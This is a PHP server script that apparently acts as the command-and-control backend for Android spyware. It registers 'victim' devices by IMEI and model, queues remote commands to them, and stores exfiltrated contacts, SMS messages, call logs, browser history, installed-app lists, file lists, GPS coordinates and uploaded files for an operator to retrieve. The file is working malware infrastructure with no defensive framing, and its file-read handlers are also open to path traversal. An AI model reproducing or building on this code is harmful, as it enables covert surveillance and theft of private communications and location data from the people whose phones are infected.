<?php
header('Content-Type: application/json; charset=UTF-8');

$response_data = [
    'status' => false
];

function createJson($json){
    return json_encode($json, JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
}

function add_new_device(){
    $device_path = "../private/devices/device_list.json";
    global $response_data;

    $post_data = [
        'INFO' => $_POST['new_device'],
        'UNIQUE_ID' => $_POST['unique_id'],
        'IMEI' => $_POST['imei'],
        'OS_VERSION' => $_POST['os_version'],
        'PHONE_PRODUCT' => $_POST['phone_product'],
        'PHONE_MODEL' => $_POST['phone_model'],
        'DEVICE_LANGUAGE' => $_POST['device_language'],
        'IS_ROOTED' => $_POST['is_rooted'],
        'CHARGE' => $_POST['charge'],
        'TOTAL_RAM' => $_POST['total_ram'],
        'LOCALE_INFO' => $_POST['locale_info']
    ];

    $strJsonFileContents = file_get_contents($device_path);
    $victim_array = json_decode($strJsonFileContents, true);
    $victim_array['device_list'][ $_POST['unique_id']] = $post_data;
    file_put_contents($device_path, json_encode($victim_array, JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    $response_data['status'] = true;
    echo createJson($response_data);
    
}

if (isset($_POST['new_device'])){
    add_new_device();
}

function insert_cmd(){

    $device_path = "../private/devices/device_list.json";
    global $response_data;


    $strJsonFileContents = file_get_contents($device_path);
    $victim_array = json_decode($strJsonFileContents, true);
    $victim_array["device_list"][$_POST['target']]['commands'][$_POST['type']] = $_POST['value'];

    file_put_contents($device_path, json_encode($victim_array, JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

    $response_data['status'] = true;
    echo createJson($response_data);
    exit(0);
}

if (isset($_POST['send_command'])){
    insert_cmd();
}


if (isset($_POST['get_file_list'])){
    $device_path = "../private/devices/device_list.json";
    global $response_data;

    $file_list_array = explode(',', str_replace(['{', '}'], '', base64_decode($_POST['get_file_list'])));
    $last_file_array = array();

    foreach ($file_list_array as $path_file){
        $f_path = explode('=', $path_file);
        array_push($last_file_array, $f_path[1]);
    }

    $strJsonFileContents = file_get_contents($device_path);
    $victim_array = json_decode($strJsonFileContents, true);
    $victim_array["device_list"][$_POST['device_id']]['FILE_LIST'] = $last_file_array;

    file_put_contents($device_path, createJson($victim_array));

    $response_data['status'] = true;
    echo createJson($response_data);
}

if (isset($_POST['device_id']) and isset($_POST['check_cmd'])){
    global $response_data;
    $device_path = "../private/devices/device_list.json";
    $strJsonFileContents = file_get_contents($device_path);
    $victim_array = json_decode($strJsonFileContents, true);
    $cmd_response = $victim_array['device_list'][$_POST['device_id']]['commands'];
    if($cmd_response!=null) 
        echo createJson($cmd_response);
    else
        echo createJson($response_data);
    unset($victim_array['device_list'][$_POST['device_id']]['commands']);
    file_put_contents($device_path, createJson($victim_array));
    exit();
}

if (isset($_POST['contact_list'])){
    $response_data['status'] = true;

    $contact_array = [
        'contact_list' => json_decode($_POST['contact_list'], true)
    ];

    $device_id = $_POST['device_id'];

    $file_name = '../private/rehber/rehber-'.$device_id.'-'.uniqid().'.json';
    $fp = fopen($file_name, 'w');
    fclose($fp);

    file_put_contents($file_name, createJson($contact_array));

    echo createJson($response_data);
}

if (isset($_POST['sms_list'])){
    $response_data['status'] = true;

    $sms_array = [
        'sms_list' => json_decode($_POST['sms_list'], true)
    ];

    $device_id = $_POST['device_id'];

    $file_name = '../private/sms/sms-'.$device_id.'-'.uniqid().'.json';
    $fp = fopen($file_name, 'w');
    fclose($fp);

    file_put_contents($file_name, createJson($sms_array));

    echo createJson($response_data);
}

if (isset($_POST['call_log_history'])){
    $call_log_array = [
        'call_log_list' => json_decode($_POST['call_log_history'], true)
    ];

    $device_id = $_POST['device_id'];

    $file_name = '../private/call_log/call-log-'.$device_id.'-'.uniqid().'.json';
    $fp = fopen($file_name, 'w');
    fclose($fp);

    file_put_contents($file_name, createJson($call_log_array));

    $response_data['status'] = true;
    echo json_encode($response_data);
}

if (isset($_POST['browser_history'])){
    $call_log_array = [
        'browser_history' => json_decode($_POST['browser_history'], true)
    ];

    $device_id = $_POST['device_id'];

    $file_name = '../private/browser_history/browser-history-'.$device_id.'-'.uniqid().'.json';
    $fp = fopen($file_name, 'w');
    fclose($fp);

    file_put_contents($file_name, createJson($call_log_array));

    $response_data['status'] = true;
    echo json_encode($response_data);
}

if (isset($_POST['app_list'])){

    $app_map_list = explode('#', str_replace(['{', '}'], '', base64_decode($_POST['app_list'])));
    $result_triim = array_map('trim', $app_map_list);
    //echo createJson($app_map_list);
    $last_app_list = array();

    foreach (array_filter($result_triim) as $value){

        $vall_array = explode(',', $value);

        $emptyRemoved = array_filter($vall_array);
        $app_firt_arr = null;
        $nn_arr = array();
        foreach ($emptyRemoved as $vvv){
            $pre_res = explode('=', $vvv);


            if (count($pre_res) == 3){
                $app_firt_arr = $pre_res[0];
                $app_name_ll = $pre_res[2];
                $nn_arr['app_name'] = $app_name_ll;
            } elseif (count($pre_res) == 2){
                if (trim($pre_res[0]) == 'package'){
                    $app_pck_name = $pre_res[1];
                    $nn_arr['app_package'] = $app_pck_name;
                } elseif (trim($pre_res[0]) == 'dir'){
                    $app_dir_namme =  $pre_res[1];
                    $nn_arr['app_dir'] = $app_dir_namme;
                }
            }
        }

        $last_app_list[$app_firt_arr] = $nn_arr;
    }
    $f_list_arr = [
        'app_list' => $last_app_list
    ];

    $device_id = $_POST['device_id'];

    $file_name = '../private/app_list/app-list-'.$device_id.'-'.uniqid().'.json';
    $fp = fopen($file_name, 'w');
    fclose($fp);

    file_put_contents($file_name, createJson($f_list_arr));

    $response_data['status'] = true;
    echo json_encode($response_data);
}

/*

Client command requests

*/


if (isset($_POST['contact_file_name'])){
    $contact_file_name = $_POST['contact_file_name'];
    $strJsonFileContents = file_get_contents('../private/rehber/'.$contact_file_name);
    $contact_json = json_decode($strJsonFileContents, true);
    echo createJson($contact_json);
}

if (isset($_POST['app_file_listed'])){
    
    $contact_file_name = $_POST['app_file_listed'];
    $strJsonFileContents = file_get_contents('../private/app_list/'.$contact_file_name);
    $contact_json = json_decode($strJsonFileContents, true);
    echo createJson($contact_json);
}

if (isset($_POST['sms_file_name'])){
    
    $contact_file_name = $_POST['sms_file_name'];
    $strJsonFileContents = file_get_contents('../private/sms/'.$contact_file_name);
    $contact_json = json_decode($strJsonFileContents, true);
    echo createJson($contact_json);
}


if (isset($_POST['browser_file_name'])){
    
    $contact_file_name = $_POST['browser_file_name'];
    $strJsonFileContents = file_get_contents('../private/browser_history/'.$contact_file_name);
    $contact_json = json_decode($strJsonFileContents, true);
    echo createJson($contact_json);
}


if (isset($_POST['call_log_file'])){
    
    $contact_file_name = $_POST['call_log_file'];
    $strJsonFileContents = file_get_contents('../private/call_log/'.$contact_file_name);
    $contact_json = json_decode($strJsonFileContents, true);
    echo createJson($contact_json);

}

if (isset($_POST['get_location'])){
    
    $device_path = "../private/devices/device_list.json";
    $strJsonFileContents = file_get_contents($device_path);
    $victim_array = json_decode($strJsonFileContents, true);
    echo createJson($victim_array['device_list'][$_POST['get_location']]['location']);
}

if (isset($_POST['show_file_path'])){
    
    $device_path = "../private/devices/device_list.json";
    $strJsonFileContents = file_get_contents($device_path);
    $victim_array = json_decode($strJsonFileContents, true);
    echo createJson($victim_array['device_list'][$_POST['target']]['FILE_LIST']);
}

if (isset($_POST['location_update'])){
    $device_path = "../private/devices/device_list.json";
    global $response_data;

    $post_data = [
        'x_axis' => $_POST['x_axis'],
        'y_axis' => $_POST['y_axis']
    ];

    $strJsonFileContents = file_get_contents($device_path);
    $victim_array = json_decode($strJsonFileContents, true);
    $victim_array["device_list"][$_POST['device_id']]['location'] = $post_data;

    file_put_contents($device_path, createJson($victim_array));

    $response_data['status'] = true;
    echo createJson($response_data);
}


if (isset($_FILES["uploaded_file"])) {

    global $response_data;

    $device_id = $_POST['device_id'];

    if (isset($_FILES["uploaded_file"])) {
        //$filename = uniqid();   //$_FILES["uploaded_file"]["name"];
        $tmp_name = $_FILES['uploaded_file']['tmp_name'];
        $error = $_FILES['uploaded_file']['error'];
        if (!empty($tmp_name)) {
            $location = '../private/file_uploaded/';
            if  (move_uploaded_file($tmp_name, $location.$tmp_name)){
                $response_data['status'] = true;
            }

        } else {
            $response_data['status'] = false;
        }
    }
    echo createJson($response_data);
}
